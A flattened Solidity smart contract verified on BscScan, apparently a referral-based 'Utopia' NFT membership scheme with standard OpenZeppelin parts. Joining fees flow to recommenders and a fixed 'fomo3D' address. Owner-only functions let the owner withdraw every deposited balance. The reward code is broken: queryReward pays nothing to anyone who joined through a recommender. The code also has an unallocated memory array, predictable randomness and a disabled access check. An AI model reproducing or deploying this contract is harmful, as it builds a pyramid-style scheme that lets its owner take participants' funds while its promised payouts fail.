/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts/Utopia/Utopia.sol


pragma solidity ^0.8.17;



interface IERC20Ext is IERC20 {
    function decimals() external view returns(uint8);
}

interface UtopiaNFT {
    function mint(address account) external;
    function totalSupply() external returns(uint256);
}

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface Relationship {
    function setRecommender(address account, address recommender) external;
    function getRecommender(address account) external view returns (address);
}

contract Utopia is  Ownable {
    uint256 public dailyReward;
    uint256 public rewardStopTime;
    IERC20Ext public usdt;
    IERC20Ext public utopiaToken;
    UtopiaNFT public utopiaNFT;
    Relationship public relationship;
    address public admin;
    bool public utopiaToken_usdt;//false usdt, true utopiaToken
    uint256 public mintPrices = 100 ether;

    mapping(address => uint256[8]) public referral_grade; //直推等级统计
    uint256[8] public all_grade_num; //全部等级统计

    mapping(address=>uint8) public vip;//个人vip级别
    mapping(address=>uint8) public history_vip;//个人vip级别
    uint8[7] public grade_requirements = [0,3,10,6,5,3,2];
    mapping(address => uint256) public IDCARD;//身份id

    mapping(address => address[]) public recommended_address; //直推地址

    bool public pause;//暂停铸币

    uint8[8] public rewardLadder = [5,20,10,10,5,5,3,2];//奖励阶梯
    uint256 public totalBonus;//总奖金
    uint256[8] public rewardLadderAmount;//奖励阶梯金额
    uint256 public numberOfTimes;//奖金发放次数
    uint256 public statisticsRewardTime;//结算时间
    mapping(address=>uint256) public createTime;//创建的时间
    mapping(address=>uint256) public lastUpdateTime;//最后修改的时间
    mapping(address=>uint256) public numberOfIndividuals;//个人计次

    uint256[8] public historyTotalBonus;//阶梯历史总奖金

    address[] public allUserAddress;//全部用户
    address public newUserAddress;//最新用户

    uint256 public todayUtopiaUserNum;//今日乌托邦用户数量

    address public fomo3D;

    uint256 public lastTime;
    bool public autoStatisticsReward;

    constructor(address utopiaToken_, address utopiaNFT_, address admin_, address relationship_) {
        utopiaToken = IERC20Ext(utopiaToken_);
        utopiaNFT = UtopiaNFT(utopiaNFT_);
        usdt = IERC20Ext(0x0B7E566590D26Ec368e08e23cEa6B18e618f541c);
        admin = admin_;
        relationship = Relationship(relationship_);
        setfomo3D(0x9E89da6357939Fb39F1A4E3B3aF3F6Fa2c3028cA);
        autoStatisticsReward = true;
    }

    //获取加入金额
    function getMintPrices() public view returns(uint256) {
        return mintPrices;
    }

    function setMintPrices(uint256 mintPrices_) public onlyOwner {
        mintPrices = mintPrices_;
    }

    //绑定推荐人成为游客
    function setRecommender(address recommender) public {
        require(IDCARD[recommender] != 0 || owner() == recommender, "Invalid recommender!");

        referral_grade[recommender][0]++;
        all_grade_num[0]++;
        numberOfIndividuals[msg.sender] = 0;
        recommended_address[recommender].push(msg.sender);
        newUserAddress = msg.sender;
        allUserAddress.push(msg.sender);
        createTime[msg.sender] = block.timestamp;
        lastUpdateTime[msg.sender] = block.timestamp;

        relationship.setRecommender(msg.sender, recommender);

        //        statisticsReward();
    }

    function nowTime() public view returns(uint) {
        return block.timestamp - (block.timestamp + 8 * 3600) % 86400 ;
    }

    //获取星球总用户数量
    function getAllUserAddressNum() public view returns(uint256 ){
        return allUserAddress.length;
    }

    //获取随机用户 >=30最少
    function getRandomUser() public view returns(address[] memory){
        uint256 len = allUserAddress.length;
        uint256 start;
        uint256 min;
        uint256 max;
        address[] memory userAddr;
        if(len >= 30){
            min = random(20)+10;
            start = random(len-min);
            max = start + min;
            uint j;
            for(uint i=start;i<max;i++){
                userAddr[j] = allUserAddress[i];
                j++;
            }
        }else{
            userAddr = allUserAddress;
        }
        return userAddr;
    }

    function getRecommendedAddress(address account) public view returns(address[] memory){
        return recommended_address[account];
    }

    function getRecommender(address account) public view returns(address) {
        return relationship.getRecommender(account);
    }

    //切换UT和USDT  切换UT需要验证pair()是否为空
    function updateToken(bool flag) public onlyOwner{
        utopiaToken_usdt = flag;
        totalBonus = 0;
        rewardLadderAmount = [0,0,0,0,0,0,0,0];
        uint256 amount;
        for(uint256 i = 0;i< 8;i++){
            if(rewardLadderAmount[i] > 0){
                amount += rewardLadderAmount[i];
            }
        }
        if(amount > 0){
            if(utopiaToken_usdt){
                usdt.transfer(msg.sender, amount);
            }else{
                utopiaToken.transfer(msg.sender, amount);
            }
        }
        numberOfTimes ++;
    }

    //铸造参与项目
    function join() public {
        require(pause == false, "Temporarily paused to mint!");
        require(getRecommender(msg.sender) != address(0), "You cant mint without recommender!");
        require(IDCARD[msg.sender] == 0, "you cant rejoin!");
        address recommender_address = getRecommender(msg.sender);//上级地址
        uint256 join_price = getMintPrices();
        require(join_price > 0, "Mint is not supported!");
        uint256 amount;
        if(utopiaToken_usdt){
            require(utopiaToken.balanceOf(msg.sender) >= join_price, "Your balance is insufficient balance to mint NFT!");
            utopiaToken.transferFrom(msg.sender, address(this), join_price);//入金
            amount = (join_price*10)/100;//直推奖励10%
            utopiaToken.transfer(recommender_address,amount);
            amount = (join_price*30)/100;
            utopiaToken.transfer(fomo3D,amount);
            totalBonus += join_price;//增加奖金
        }else{
            require(usdt.balanceOf(msg.sender) >= join_price, "Your balance is insufficient balance to mint NFT!");
            usdt.transferFrom(msg.sender, address(this), join_price);//入金
            amount = (join_price*10)/100;//直推奖励10%
            usdt.transfer(recommender_address,amount);
            amount = (join_price*30)/100;
            usdt.transfer(fomo3D,amount);
            totalBonus += join_price;//增加奖金
        }

        uint256 totalNftCount = utopiaNFT.totalSupply();
        IDCARD[msg.sender] = totalNftCount+1;
        todayUtopiaUserNum++;

        address current_address = msg.sender;//当前地址

        uint8 remain_vip;//历史等级
        uint8 current_vip;//当前等级
        remain_vip = vip[current_address];//历史等级
        //上级级别控制
        for(uint256 i = 1; i < 7; i++) {
            if(recommender_address == address(0)){
                break;
            }
            current_vip = calculationGrade(current_address);//当前等级
            if(current_vip > remain_vip){
                vip[current_address] = current_vip;//修改自身等级
                if(lastUpdateTime[current_address] < statisticsRewardTime){
                    history_vip[current_address] = current_vip;
                    lastUpdateTime[current_address] = block.timestamp;
                }
                all_grade_num[current_vip]++;
                all_grade_num[current_vip-1]--;
                remain_vip = vip[recommender_address];//上级历史等级
                referral_grade[recommender_address][current_vip]++;//给上级增加直推等级
                referral_grade[recommender_address][current_vip-1]--;//给上级增加直推等级
                current_address = recommender_address;//更新当前地址
                recommender_address = getRecommender(current_address);//更新上级地址
            }else{
                break;
            }
        }

        utopiaNFT.mint(msg.sender);
        //        statisticsReward();
    }

    //计算等级
    function calculationGrade(address account) public view returns(uint8){
        if(referral_grade[account][6] >= grade_requirements[6]){
            return 7;
        }else if(referral_grade[account][5] >= grade_requirements[5]){
            return 6;
        }else if(referral_grade[account][4] >= grade_requirements[4]){
            return 5;
        }else if(referral_grade[account][3] >= grade_requirements[3]){
            return 4;
        }else if(referral_grade[account][2] >= grade_requirements[2]){
            return 3;
        }else if(referral_grade[account][1] >= grade_requirements[1]){
            return 2;
        }else if(IDCARD[account] != 0){
            return 1;
        }else{
            return 0;
        }
    }

    //结算奖励
    function statisticsReward() public {
        /*if(!(msg.sender == owner() || msg.sender == admin)){
            if(nowTime() <= lastTime || !autoStatisticsReward){
                return;
            }
        }*/
        uint256 totalNftCount = utopiaNFT.totalSupply();
        if(totalBonus > 0 && totalNftCount > 0){
            //            lastTime = nowTime();
            uint256 bonus = 0;
            uint256 historyBonus = 0;
            uint256 rAmount = totalBonus;
            for(uint256 i=0;i<all_grade_num.length;i++){
                if(all_grade_num[i] > 0){
                    bonus = totalBonus*rewardLadder[i]/100;
                    historyBonus = historyTotalBonus[i] + bonus;
                    rewardLadderAmount[i] = historyBonus/all_grade_num[i];
                    historyTotalBonus[i] = historyBonus;
                    rAmount -= bonus;
                }
            }
            /*if(rAmount > 0){
                if(utopiaToken_usdt){
                    utopiaToken.transfer(fomo3D,rAmount);
                }else{
                    usdt.transfer(fomo3D,rAmount);
                }
            }*/
            statisticsRewardTime = block.timestamp;
            totalBonus = 0;
            numberOfTimes++;
            todayUtopiaUserNum = 0;
        }
    }

    //查询奖励
    function queryReward(address account) public view returns(uint256){
        uint256 amount = 0;
        if(getRecommender(account) != address(0) || numberOfTimes > numberOfIndividuals[account] || statisticsRewardTime <= createTime[account]){
            return amount;
        }
        if(statisticsRewardTime <= lastUpdateTime[account]){
            return rewardLadderAmount[history_vip[account]];
        }else{
            return rewardLadderAmount[vip[account]];
        }
    }

    //领取奖励
    function receiveRewards() public {
        uint256 amount = queryReward(msg.sender);
        require(amount > 0, "You have no reward!");
        if(utopiaToken_usdt){
            utopiaToken.transfer(msg.sender,amount);
        }else{
            usdt.transfer(msg.sender,amount);
        }
        historyTotalBonus[vip[msg.sender]] -= amount;
        numberOfIndividuals[msg.sender] = numberOfTimes;

        //        statisticsReward();
    }

    function setMintAllowance(bool flag) public onlyOwner {
        pause = flag;
    }

    //管理员取款
    function rewardUSDT(address to, uint256 amount) public onlyOwner {
        usdt.transfer(to,amount);
    }

    //管理员取款
    function rewardUT(address to, uint256 amount) public onlyOwner {
        utopiaToken.transfer(to,amount);
    }

    function setRelationship(address relationship_) public onlyOwner {
        relationship = Relationship(relationship_);
    }

    function setfomo3D(address fomo3D_) public onlyOwner {
        fomo3D = fomo3D_;
    }

    function setUtopiaToken(address utopiaToken_) public onlyOwner {
        utopiaToken = IERC20Ext(utopiaToken_);
    }

    function setUtopiaNFT(address utopiaNFT_) public onlyOwner {
        utopiaNFT = UtopiaNFT(utopiaNFT_);
    }

    //随机数
    function random(uint number) public view returns(uint) {
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,
            msg.sender))) % number;
    }

    function setAdmin(address admin_) public onlyOwner {
        admin = admin_;
    }

    function _tokenAllocation(IERC20 _ERC20, address _address, uint256 _amount) external onlyOwner{
        _ERC20.transfer(_address, _amount);
    }


}